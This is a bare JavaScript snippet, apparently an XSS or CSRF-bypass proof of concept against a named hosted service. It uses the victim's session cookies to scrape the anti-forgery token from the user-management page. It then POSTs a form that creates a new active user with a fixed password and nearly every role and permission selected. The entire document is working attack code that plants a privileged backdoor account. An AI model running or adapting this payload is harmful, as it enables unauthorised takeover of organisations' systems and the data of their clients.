// Fetch token and use it in POST request
fetch('https://inspective.leaddocket.com/manageusers/add', {
    method: 'GET',
    credentials: 'include'
})
.then(response => response.text())
.then(html => {
    const match = html.match(/name="__RequestVerificationToken".*?value="([^"]+)"/s);
    if (match && match[1]) {
        const token = match[1];
        
        // Prepare the form data
        const formData = new URLSearchParams();
        formData.append('FirstName', 'frogdog2');
        formData.append('LastName', 'loglog2');
        formData.append('Initials', '');
        formData.append('Email', 'triagtest@abc.abc');
        formData.append('UserName', 'triagetest@abc.abc');
        formData.append('NewPassword', 'Test@123456');
        formData.append('PhoneNumber', '');
        formData.append('DefaultOffice', '');
        formData.append('Timezone', '');
        formData.append('Code', '');
        formData.append('CalendarInvitesTo', '');
        formData.append('IsActive', 'true');
        formData.append('Licensed', 'true');
        formData.append('LeadRoles.Index', '0');
        formData.append('LeadRoles[0].LeadRoleId', '1');
        formData.append('LeadRoles.Index', '1');
        formData.append('LeadRoles[1].LeadRoleId', '2');
        formData.append('LeadRoles.Index', '2');
        formData.append('LeadRoles[2].LeadRoleId', '3');
        formData.append('LeadRoles.Index', '3');
        formData.append('LeadRoles[3].LeadRoleId', '4');
        formData.append('LeadRoles.Index', '4');
        formData.append('LeadRoles[4].LeadRoleId', '6');
        formData.append('LeadRoles.Index', '5');
        formData.append('LeadRoles[5].LeadRoleId', '8');
        formData.append('UserPermissions.Index', '0');
        formData.append('UserPermissions[0].RoleId', '1');
        formData.append('UserPermissions[0].Selected', 'true');
        formData.append('UserPermissions.Index', '1');
        formData.append('UserPermissions[1].RoleId', '6');
        formData.append('UserPermissions.Index', '2');
        formData.append('UserPermissions[2].RoleId', '7');
        formData.append('UserPermissions.Index', '3');
        formData.append('UserPermissions[3].RoleId', '12');
        formData.append('UserPermissions.Index', '4');
        formData.append('UserPermissions[4].RoleId', '8');
        formData.append('UserPermissions.Index', '5');
        formData.append('UserPermissions[5].RoleId', '10');
        formData.append('UserPermissions.Index', '6');
        formData.append('UserPermissions[6].RoleId', '9');
        formData.append('UserPermissions.Index', '7');
        formData.append('UserPermissions[7].RoleId', '13');
        formData.append('UserPermissions.Index', '8');
        formData.append('UserPermissions[8].RoleId', '14');
        formData.append('UserPermissions.Index', '9');
        formData.append('UserPermissions[9].RoleId', '15');
        formData.append('UserPermissions.Index', '10');
        formData.append('UserPermissions[10].RoleId', '16');
        formData.append('UserPermissions.Index', '11');
        formData.append('UserPermissions[11].RoleId', '17');
        formData.append('UserPermissions.Index', '12');
        formData.append('UserPermissions[12].RoleId', '18');
        formData.append('UserPermissions.Index', '13');
        formData.append('UserPermissions[13].RoleId', '19');
        formData.append('UserPermissions.Index', '14');
        formData.append('UserPermissions[14].RoleId', '20');
        formData.append('UserPermissions.Index', '15');
        formData.append('UserPermissions[15].RoleId', '21');
        formData.append('UserPermissions.Index', '16');
        formData.append('UserPermissions[16].RoleId', '23');
        formData.append('UserPermissions.Index', '17');
        formData.append('UserPermissions[17].RoleId', '24');
        formData.append('UserPermissions.Index', '18');
        formData.append('UserPermissions[18].RoleId', '26');
        formData.append('SendAccountCreatedEmail', 'true');
        formData.append('__RequestVerificationToken', token);
        formData.append('_LDPreventDuplicateToken', '');

        // Make the POST request with the token
        fetch('https://inspective.leaddocket.com/manageusers/add', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            credentials: 'include',
            body: formData.toString()
        });
    }
});
